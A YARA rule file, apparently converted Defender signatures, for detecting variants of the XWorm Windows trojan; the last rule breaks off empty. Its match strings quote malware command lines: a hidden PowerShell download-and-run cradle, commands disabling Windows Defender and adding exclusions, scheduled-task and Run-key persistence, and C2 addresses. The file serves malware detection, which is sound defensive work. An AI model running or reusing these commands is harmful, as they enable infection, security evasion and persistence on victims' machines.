rule Trojan_Win64_XWorm_GPA_2147904521_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GPA!MTB"
        threat_id = "2147904521"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "src\\main.rshttps://107.175.3.10" ascii //weight: 5
        $x_5_2 = ".binhttps://github.comInternet" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_DA_2147922667_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.DA!MTB"
        threat_id = "2147922667"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {48 8b c2 83 e0 1f 0f b6 44 18 ?? 30 04 16 48 ff c2 49 3b d0}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_DA_2147922667_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.DA!MTB"
        threat_id = "2147922667"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:/explorerwin/mewobfm.dll" ascii //weight: 1
        $x_1_2 = "Failed to load the DLL" ascii //weight: 1
        $x_10_3 = "C:/explorerwi/explorer.exe" ascii //weight: 10
        $x_1_4 = "C:/explorerwin/python.exe" ascii //weight: 1
        $x_12_5 = "C:/explorerwi/pdf.dll" ascii //weight: 12
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            ((1 of ($x_12_*) and 1 of ($x_1_*))) or
            ((1 of ($x_12_*) and 1 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_XWorm_AXM_2147926498_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AXM!MTB"
        threat_id = "2147926498"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "taskkill /IM EpicGamesLauncher.exe /F" ascii //weight: 2
        $x_2_2 = "taskkill /IM FortniteClient-Win64-Shipping_BE.exe /F" ascii //weight: 2
        $x_2_3 = "taskkill /IM FortniteClient-Win64-Shipping.exe /F" ascii //weight: 2
        $x_2_4 = "taskkill /IM x64dbg.exe" ascii //weight: 2
        $x_3_5 = "net stop winmgmt" ascii //weight: 3
        $x_4_6 = "ipconfig /flushdnetsh winsock renetsh advfirewalnetsh int ipv4 rnetsh int ipv6 ripconfig /releasnetsh int ip res" ascii //weight: 4
        $x_5_7 = "Permanent Spoofer\\x64\\Release\\Permanent Spoofer.pdb" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_PAFW_2147926653_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.PAFW!MTB"
        threat_id = "2147926653"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {66 0f 72 e1 04 66 0f 6f c1 66 0f 72 d0 1f 66 0f fe c1 66 0f 38 40 c5 66 0f fa d0 66 0f 6e c2 0f 54 d6 66 0f 67 d2 66 0f 67 d2 66 0f fc d0 66 0f 6e 41 f8 0f 57 d0 66 0f 7e 51 f8 41 83 f8 28 0f 8c}  //weight: 2, accuracy: High
        $x_2_2 = {41 f7 e8 c1 fa 04 8b c2 c1 e8 1f 03 d0 0f be c2 6b c8 36 41 0f b6 c0 41 ff c0 2a c1 04 35 41 30 41 ff 41 83 f8 2c 7c}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GVA_2147935573_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GVA!MTB"
        threat_id = "2147935573"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b 55 10 48 8b 45 f0 48 01 d0 0f b6 00 0f be d0 8b 45 fc 01 c2 8b 45 fc c1 e0 0a 01 c2 8b 45 fc c1 e8 06 31 d0 89 45 fc 48 83 45 f0 01 48 8b 45 10 48 89 c1 ?? ?? ?? ?? ?? 48 39 45 f0 72 c0}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_SDEL_2147940094_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.SDEL!MTB"
        threat_id = "2147940094"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {31 c9 31 d2 45 31 c9 ff 15 fb 55 ff ff 48 8b 0d fc b0 ff ff 4c 63 59 04 8b 0d ce a3 ff ff 8b 15 cc a3 ff ff 8d 69 ff 0f af e9 89 e9}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GZK_2147943016_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GZK!MTB"
        threat_id = "2147943016"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {48 89 d1 48 8d 15 ?? ?? ?? ?? ff 15 ?? ?? ?? ?? 48 85 c0 0f 84 ?? ?? ?? ?? 48 8d 15 ?? ?? ?? ?? 48 89 f1 48 89 c7 ff d0 48 89 45 ?? 48 8d 15 ?? ?? ?? ?? 48 89 f1 ff d7 48 89 45 ?? 48 8d 15 ?? ?? ?? ?? 48 89 f1 ff d7 48 89 45 00 48 8d 15 ?? ?? ?? ?? 48 89 f1 48 89 7d ?? ff d7}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GZM_2147944854_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GZM!MTB"
        threat_id = "2147944854"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {49 89 c7 48 89 d9 e8 ?? ?? ?? ?? 48 89 c1 4c 89 f2 e8 ?? ?? ?? ?? 49 89 c4 48 c7 44 24 ?? 00 00 00 00 41 b8 04 00 00 00 48 89 f9 4c 89 fa 41 b9 04 00 00 00 ff d0 48 c7 44 24 ?? 00 00 00 00 4c 8d 05 ?? ?? ?? ?? 41 b9 04 00 00 00 48 89 f9 4c 89 fa e8 ?? ?? ?? ?? 48 c7 44 24 ?? 00 00 00 00 41 b8 04 00 00 00 48 89 f9 4c 89 fa 45 31 c9 41 ff d4}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GXF_2147946470_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GXF!MTB"
        threat_id = "2147946470"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 8d 55 b0 48 8b 85 d0 00 00 00 48 c7 44 24 20 00 00 00 00 41 b9 00 00 00 00 49 89 d0 48 89 c2 b9 00 00 00 00 e8}  //weight: 5, accuracy: High
        $x_1_2 = "cmd.exe /c sc config WinDefend start=disabled > nul 2>&1" ascii //weight: 1
        $x_1_3 = "sc stop WinDefend > nul 2>&1" ascii //weight: 1
        $x_1_4 = "TEMP\\svchost.exe" ascii //weight: 1
        $x_1_5 = "DisableRealtimeMonitoring" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GAPE_2147953814_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GAPE!MTB"
        threat_id = "2147953814"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_8_1 = "7.tcp.eu.ngrok.io" ascii //weight: 8
        $x_1_2 = "Socket creation" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GAPF_2147953815_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GAPF!MTB"
        threat_id = "2147953815"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_8_1 = "Ejecutando shellcode" ascii //weight: 8
        $x_1_2 = "payload.enc" ascii //weight: 1
        $x_1_3 = "Shellcode ejecutado" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_BAA_2147956285_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.BAA!MTB"
        threat_id = "2147956285"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {44 0f 11 7c 24 60 48 89 c2 48 c1 f8 3f 48 89 c1 48 b8 65 21 0b 59 c8 42 16 b2 48 89 d3 48 f7 ea 48 01 da 48 c1 fa 04 48 29 ca 48 6b d2 17 48 89 d8 48 29 d3 48 83 fb 02 0f 8f 5e 01}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_SXA_2147959145_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.SXA!MTB"
        threat_id = "2147959145"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "svcchost" ascii //weight: 2
        $x_2_2 = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri" ascii //weight: 2
        $x_1_3 = "findstr /R \"[0-9]\\.[0-9]\\.[0-9]" ascii //weight: 1
        $x_1_4 = "Disabling Google Chrome Protection" ascii //weight: 1
        $x_1_5 = "Windows Defender is disabled" ascii //weight: 1
        $x_1_6 = "Deleting C:\\Symbols" ascii //weight: 1
        $x_1_7 = "- SmartScreen is disabled" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AMTB_2147960592_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm!AMTB"
        threat_id = "2147960592"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Syka blyat. Fuck all. I hate all of you bastard. I say hi to everyone and wish you to go to hell." ascii //weight: 2
        $x_2_2 = "I hope you realize your stupidity and die." ascii //weight: 2
        $x_2_3 = "DoBro666. KAPA BE4HAYA .07-08-25. Made in Russia. TheThing" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AHB_2147962124_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AHB!MTB"
        threat_id = "2147962124"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "50"
        strings_accuracy = "Low"
    strings:
        $x_30_1 = {4c 8d 0c 52 4d 01 c1 49 ff c0 4d 89 ca 49 d1 ea 4c 89 ca 48 31 c2 41 f6 c1 ?? 49 0f 44 d2 48 89 55 20 49 81 f8 ?? ?? ?? ?? 75}  //weight: 30, accuracy: Low
        $x_20_2 = "PROTECT_V2_PAYLOAD" ascii //weight: 20
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_ARR_2147962419_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.ARR!MTB"
        threat_id = "2147962419"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {4c 21 fb 45 89 fe 41 83 e6 ?? 4c 01 eb 4d 89 f8 49 c1 e8}  //weight: 10, accuracy: Low
        $x_6_2 = {48 8b 4a f8 4c 8d 04 28 49 83 c0 ?? 41 c6 00 ?? 49 89 c1 49 83 f1}  //weight: 6, accuracy: Low
        $x_4_3 = {48 8b 3b 48 8b 73 ?? 48 89 f8 48 f7 d8 4c 8b 7b}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_GHM_2147963033_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.GHM!MTB"
        threat_id = "2147963033"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {48 8d 45 b0 48 89 c1 e8 ?? ?? ?? ?? 48 85 c0 ?? ?? 48 8d 15 ?? ?? ?? ?? 48 8d 45 b0 48 89 c1 e8 ?? ?? ?? ?? 48 85 c0 ?? ?? 48 8d 15 ?? ?? ?? ?? 48 8d 45 b0 48 89 c1 e8}  //weight: 5, accuracy: Low
        $x_5_2 = {48 89 c1 48 8b 05 ?? ?? ?? ?? ff d0 b9 ?? ?? ?? ?? 48 8b 05 ?? ?? ?? ?? ff d0}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_A_2147964176_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.A!AMTB"
        threat_id = "2147964176"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "AMTB: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "-NoProfile -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadString('http://atualizadoativado.com/0/0.ps1') | iex\"" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_SLWV_2147965008_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.SLWV!MTB"
        threat_id = "2147965008"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {48 8b 8c 24 b8 00 00 00 89 4c 24 20 48 8b 8c 24 c0 00 00 00 4c 8b c9 44 8b c0 48 8b 54 24 60 48 8b 4c 24 58 ff 15 fd 50 01 00 48 8b 4c 24 58}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AB_2147965082_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AB!MTB"
        threat_id = "2147965082"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_6_1 = {4c 8d 94 24 20 02 00 00 b9 04 01 00 00 4c 89 54 24 50 4c 89 d2 ff 15 ?? 7b 00 00 85 c0 0f 84 ?? 00 00 00 45 31 c0 48 8b 4c 24 50 4c 8d a4 24 30 03 00 00 [0-15] 00 00 ff 15 ?? 7b 00 00 85 c0 0f 84 ?? 00 00 00 ba 2e 00 00 00 4c 89 e1 e8 ?? 16 00 00 48 85 c0 74 10 48 8d 15 [0-2] 00 00 48 89 c1 ff 15 [0-2] 00 00 45 31 d2}  //weight: 6, accuracy: Low
        $x_6_2 = {53 48 83 ec 58 65 48 8b 04 25 30 00 00 00 48 8b 70 08 48 8b 1d ?? 44 00 00 48 8b 3d 6d 83 00 00 eb 13 0f 1f 00 48 39 c6 0f 84 af 00 00 00 b9 e8 03 00 00 ff d7 31 c0 f0 48 0f b1 33 75 e7}  //weight: 6, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AHA_2147966284_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AHA!MTB"
        threat_id = "2147966284"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "60"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "[*] Console mode active" ascii //weight: 10
        $x_30_2 = "[-] UAC refused. Retrying in 2 sec..." ascii //weight: 30
        $x_20_3 = "[*] Running as Administrator" ascii //weight: 20
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_VGY_2147967397_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.VGY!MTB"
        threat_id = "2147967397"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {4e 8d 04 17 4d 8d 4a 01 41 83 e2 1f 49 8b c1 83 e0 1f 0f b6 04 08 41 28 00 41 0f b6 00 41 32 04 0a 4d 8b d1 41 88 00 4c 3b cb 72 d4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_VGZ_2147967398_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.VGZ!MTB"
        threat_id = "2147967398"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0f b6 54 04 58 80 f2 70 88 54 05 98 48 ff c0 48 83 f8 24 75 eb}  //weight: 1, accuracy: High
        $x_1_2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 1
        $x_1_3 = "InternetOpenUrlA" ascii //weight: 1
        $x_1_4 = "processhacker" ascii //weight: 1
        $x_1_5 = "ollydbg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_VGX_2147967399_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.VGX!MTB"
        threat_id = "2147967399"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {83 f0 11 48 83 c2 01 88 42 ff 0f b6 02 84 c0 75 ef}  //weight: 1, accuracy: High
        $x_1_2 = "box.moe" ascii //weight: 1
        $x_1_3 = "InternetOpenUrlA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_SXB_2147967425_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.SXB!MTB"
        threat_id = "2147967425"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $x_15_1 = {4e 8d 04 17 4d 8d 4a 01 41 83 e2 ?? 49 8b c1 83 e0 ?? 0f b6 04 08 41 28 00 41 0f b6 00 41 32 04 0a 4d 8b d1 41 88 00 4c 3b cb}  //weight: 15, accuracy: Low
        $x_5_2 = "schtasks.exe /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"rundll32.exe \\\"%s\\\",get_hostfxr_path\" /sc onlogon /rl highest /f" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_BI_2147967751_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.BI!MTB"
        threat_id = "2147967751"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Go build ID:" ascii //weight: 1
        $x_1_2 = "_o_Xmdn7ra6sNn9w0KCI/l1gQkku7GBBI0G7BK4_X/dvjhxMLBF4cJzM6ZxA6B/7epFXzwUqnh4G0Om2Yiu" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_NI_2147968205_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.NI!MTB"
        threat_id = "2147968205"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {41 0f b6 01 84 c0 74 39 88 14 24 88 44 24 01 8d 4a bf 80 f9 19 77 06 80 c2 20 88 14 24}  //weight: 2, accuracy: High
        $x_1_2 = {49 ff c0 4c 89 44 24 08 49 ff c1 4c 89 4c 24 10 eb b7 84 d2 75 0a 41 80 39 00 75 04 33 c0 eb 05 b8 01 00 00 00 85 c0 75 0d 42 0f b7 0c 57}  //weight: 1, accuracy: High
        $x_1_3 = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"%s\" /t REG_SZ /d" ascii //weight: 1
        $x_1_4 = "APPDATA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_PAHV_2147968263_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.PAHV!MTB"
        threat_id = "2147968263"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath" ascii //weight: 2
        $x_1_2 = "schtasks /create /f /sc onlogon" ascii //weight: 1
        $x_1_3 = "SeShutdownPrivilege" ascii //weight: 1
        $x_1_4 = "DisableTaskMgr" ascii //weight: 1
        $x_2_5 = "HiddenCam" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AMX_2147968693_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AMX!MTB"
        threat_id = "2147968693"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {68 74 74 70 3a 2f 2f 38 30 2e 32 35 33 2e 32 34 39 2e 31 36 39 3a 35 30 30 30 2f [0-15] 2e 65 78 65}  //weight: 3, accuracy: Low
        $x_1_2 = "Local Settings\\Application Data\\Service.exe" ascii //weight: 1
        $x_1_3 = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Users" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_KK_2147969320_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.KK!MTB"
        threat_id = "2147969320"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "35"
        strings_accuracy = "High"
    strings:
        $x_20_1 = {48 8d 4c 24 60 48 83 ff 0f 49 0f 47 ce 33 d2 49 8b c0 48 f7 f3 0f b6 04 0a 42 30 04 06 49 ff c0 49 8b c5 48 2b c6 4c 3b c0}  //weight: 20, accuracy: High
        $x_10_2 = ".xworm" ascii //weight: 10
        $x_5_3 = "HVNC.dll" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_DNU_2147969810_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.DNU!MTB"
        threat_id = "2147969810"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_7_1 = {89 c8 31 d2 41 f7 f1 41 0f b6 04 10 41 30 04 0a 48 83 c1 01 49 39 cb}  //weight: 7, accuracy: High
        $x_1_2 = "C:\\Windows\\Temp\\update.dat" ascii //weight: 1
        $x_1_3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 1
        $x_1_4 = "GetTickCount" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_B_2147970551_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.B!AMTB"
        threat_id = "2147970551"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "AMTB: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ze_msg.vbs" ascii //weight: 1
        $x_1_2 = "<Xwormmm>" ascii //weight: 1
        $x_1_3 = "@@ZEROXK2_PLACEHOLDER@@" ascii //weight: 1
        $x_1_4 = "Set f=s.GetFolder(\"%s\")" ascii //weight: 1
        $x_1_5 = "StartHRDP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AQR_2147970849_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AQR!MTB"
        threat_id = "2147970849"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
